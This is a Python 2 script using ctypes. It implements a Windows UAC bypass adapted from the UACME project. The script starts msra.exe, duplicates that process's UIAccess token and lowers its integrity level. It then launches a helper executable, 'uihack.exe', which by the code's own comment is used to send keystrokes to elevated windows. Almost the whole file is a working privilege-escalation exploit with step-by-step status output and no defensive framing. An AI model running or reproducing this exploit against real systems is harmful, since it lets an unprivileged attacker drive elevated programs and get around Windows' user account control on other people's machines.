import ctypes
import enum
import os

TOKEN_QUERY = 0x0008
TOKEN_DUPLICATE = 0x0002
TOKEN_ALL_ACCESS = (0x000F0000 | 0x0001 | 0x0002 | 0x0004 | 0x00000008 | 0x0010 | 0x00000020 | 0x0040 | 0x0080 | 0x0100)

class c_enum(enum.IntEnum):
    @classmethod
    def from_param(cls, obj):
        return ctypes.c_int(cls(obj))

class TOKEN_TYPE(c_enum):
	TokenPrimary 		= 1
	TokenImpersonation 	= 2

class TOKEN_INFORMATION_CLASS(c_enum):
	TokenUser		= 1
	TokenElevation		= 20
	TokenIntegrityLevel	= 25

class IntegrityLevel(object):
	HIGH_RID	= 0x00003000
	MEDIUM_RID	= 0x00002000
	MEDIUM_PLUS_RID = MEDIUM_RID + 0x100

class GroupAttributes(object):
	SE_GROUP_ENABLED	= 0x00000004
	SE_GROUP_INTEGRITY	= 0x00000020         
	SE_GROUP_LOGON_ID	= 0xC0000000 
	SE_GROUP_MANDATORY	= 0x00000001 
	SE_GROUP_OWNER		= 0x00000008   
	SE_GROUP_RESOURCE	= 0x20000000 
	SE_GROUP_USE_FOR_DENY_ONLY  = 0x00000010 
	SE_GROUP_INTEGRITY_ENABLED  = 0x00000040
	SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002

class SID_AND_ATTRIBUTES(ctypes.Structure):                           
    _fields_ = [("Sid",		ctypes.c_void_p),
		("Attributes",	ctypes.c_ulong)]

class TOKEN_MANDATORY_LABEL(ctypes.Structure):
    _fields_ = [("Label",	SID_AND_ATTRIBUTES)]

class SID_IDENTIFIER_AUTHORITY(ctypes.Structure):
    _fields_ = [("Value",	ctypes.c_byte * 6)]

class ShellExecInfo(ctypes.Structure):
	_fields_ = [("cbSize", 		 ctypes.c_uint32),
			("fMask",	 ctypes.c_ulong),
			("hwnd", 	 ctypes.c_void_p),
			("lpVerb", 	 ctypes.c_wchar_p),
			("lpFile", 	 ctypes.c_wchar_p),
			("lpParameters", ctypes.c_wchar_p),
			("lpDirectory",  ctypes.c_wchar_p),
			("nShow", 	 ctypes.c_int),
			("hInstApp", 	 ctypes.c_void_p),
			("lpIDList", 	 ctypes.c_void_p),
			("lpClass", 	 ctypes.c_wchar_p),
			("hKeyClass", 	 ctypes.c_void_p),
			("dwHotKey", 	 ctypes.c_uint32),
			("hIcon", 	 ctypes.c_void_p),
			("hProcess", 	 ctypes.c_void_p)]

class PROCESS_INFORMATION(ctypes.Structure):                          
    _fields_ = [("hProcess", 	 ctypes.c_void_p),
		("hThread", 	 ctypes.c_void_p),
		("dwProcessId",  ctypes.c_ulong),
		("dwThreadId", 	 ctypes.c_ulong)]

class STARTUPINFO(ctypes.Structure):
    _fields_ = [("cb", 			ctypes.c_ulong),
               ("lpReserved",		ctypes.c_char_p),
               ("lpDesktop", 		ctypes.c_char_p),
               ("lpTitle",		ctypes.c_char_p),
               ("dwX", 			ctypes.c_ulong),
               ("dwY", 			ctypes.c_ulong),
               ("dwXSize", 		ctypes.c_ulong),
               ("dwYSize", 		ctypes.c_ulong),
               ("dwXCountChars", 	ctypes.c_ulong),
               ("dwYCountChars", 	ctypes.c_ulong),
               ("dwFillAttribute", 	ctypes.c_ulong),
               ("dwFlags", 		ctypes.c_ulong),
               ("wShowWindow",		ctypes.c_ushort),
               ("cbReserved2",		ctypes.c_ushort),
               ("lpReserved2",		ctypes.POINTER(ctypes.c_byte)),
               ("hStdInput",		ctypes.c_void_p),
               ("hStdOutput",		ctypes.c_void_p),
               ("hStdError", 		ctypes.c_void_p)]

class disable_fsr():
	disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
	revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection

	def __enter__(self):
		self.old_value = ctypes.c_long()
		self.success = self.disable(ctypes.byref(self.old_value))

	def __exit__(self, type, value, traceback):
		if self.success:
			self.revert(self.old_value)


def main():
	if os.path.isfile(os.path.join(os.getcwd(), "dist\\uihack.exe")):
		# 
		# Create the host process
		# 
		shinfo = ShellExecInfo()
		shinfo.cbSize = ctypes.sizeof(shinfo)
		shinfo.fMask = 0x00000040
		shinfo.lpFile = "c:\\windows\\system32\\msra.exe"
		shinfo.nShow = 0
		shinfo.lpParameters = None

		with disable_fsr():
			if ctypes.windll.shell32.ShellExecuteExW(ctypes.byref(shinfo)):
				print "[+] Created host process PID: {pid} using ShellExecuteExW".format(pid=shinfo.hProcess)
			else:
				print "[-] Unable to create host process using ShellExecuteExW"
				return False


		# 
		# Open the host process token so we can duplicate it
		# 
		token = ctypes.c_void_p(ctypes.c_void_p(-1).value)
		if ctypes.windll.ntdll.NtOpenProcessToken(shinfo.hProcess, (TOKEN_DUPLICATE | TOKEN_QUERY),
							ctypes.byref(token)) == ctypes.c_ulong(0xC0000001):
			print "[-] Unable to open process token using NtOpenProcessToken"
			return False
		else:
			print "[+] Opened process token using NtOpenProcessToken: {token}".format(token=token)


		# 
		# Duplicate primary token
		#
		dtoken = ctypes.c_void_p(ctypes.c_void_p(-1).value)
		if ctypes.windll.ntdll.NtDuplicateToken(token, TOKEN_ALL_ACCESS, None, False,
							TOKEN_TYPE.TokenPrimary, ctypes.byref(dtoken)) == ctypes.c_ulong(0xC0000001):
			print "[-] Unable to duplicate token using NtDuplicateToken"
			return False
		else:
			print "[+] Duplicated token using NtDuplicateToken: {dtoken}".format(dtoken=dtoken)

		ctypes.windll.ntdll.NtClose(token)
		ctypes.windll.ntdll.NtTerminateProcess(shinfo.hProcess, 0)
		ctypes.windll.kernel32.CloseHandle(shinfo.hProcess)


		# 
		# Lower duplicated token IL from Medium+ to Medium
		# 
		mlAuthority = SID_IDENTIFIER_AUTHORITY((0, 0, 0, 0, 0, 16))
		pIntegritySid = ctypes.c_void_p()

		if ctypes.windll.ntdll.RtlAllocateAndInitializeSid(ctypes.byref(mlAuthority), 1, IntegrityLevel.MEDIUM_RID,
									0, 0, 0, 0, 0, 0, 0, ctypes.byref(pIntegritySid)) == ctypes.c_ulong(0xC0000001):
			print "[-] Unable to Initialize Medium SID using RtlAllocateAndInitializeSid"
			return False
		else:
			print "[+] Initialized Medium SID using RtlAllocateAndInitializeSid"

		saa = SID_AND_ATTRIBUTES()
		saa.Attributes = GroupAttributes.SE_GROUP_INTEGRITY
		saa.Sid = pIntegritySid

		tml = TOKEN_MANDATORY_LABEL()
		tml.Label = saa

		if ctypes.windll.ntdll.NtSetInformationToken(dtoken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
								ctypes.byref(tml), ctypes.sizeof(tml)) == ctypes.c_ulong(0xC0000001):													
			print "[-] Unable to lower duplicated token IL from Medium+ to Medium using NtSetInformationToken"
			return False
		else:
			print "[+] Lowered duplicated token IL from Medium+ to Medium using NtSetInformationToken"


		#
		# Spawn a new process with UIAccess flag and Medium Integrity
		# We use this process to send keystrokes to our elevated windows
		# https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/methods/tyranid.c
		#
		lpStartupInfo = STARTUPINFO()
		lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)
		lpStartupInfo.dwFlags = 0x00000001
		lpStartupInfo.wShowWindow = 5
		lpProcessInformation = PROCESS_INFORMATION()
		lpApplicationName = os.path.join(os.getcwd(), "dist\\uihack.exe")

		if not ctypes.windll.advapi32.CreateProcessAsUserA(dtoken, None, lpApplicationName, None, None, False,
									(0x04000000 | 0x00000010), None, None, ctypes.byref(lpStartupInfo),
									ctypes.byref(lpProcessInformation)):
			print "[-] Unable to create process using CreateProcessAsUserA"
			return False
		else:
			print "[+] Created process PID: {pid} using CreateProcessAsUserA".format(pid=lpProcessInformation.dwProcessId)
	else:
		print "[-] Cannot proceed, uihack executable not found on disk..."
		return False

if __name__ == "__main__":
	main()
